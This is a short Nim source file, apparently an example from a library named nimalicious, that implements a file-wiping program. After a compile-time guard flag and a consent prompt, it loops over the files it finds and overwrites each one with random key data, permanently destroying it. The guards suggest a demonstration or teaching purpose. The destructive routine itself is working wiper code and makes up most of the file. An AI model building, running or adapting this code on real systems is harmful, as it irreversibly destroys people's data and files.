# Oops, all malware.
import std/os
import nimalicious/[consent, files, crypto]

when not defined(debug) and not defined(yesReallyDestroyMyMachine):
  {.error: "You are about to build genuinely destructive malware. Supply -d:yesReallyDestroyMyMachine in order to build.".}

askConsent(
  "all_malware",
  @["You will permanently lose a lot of valuable data and files."]
)

for file in findFiles():
  when not defined(debug):
    writeFile(file, genKey(2048))
  else:
    echo "Overwriting ", file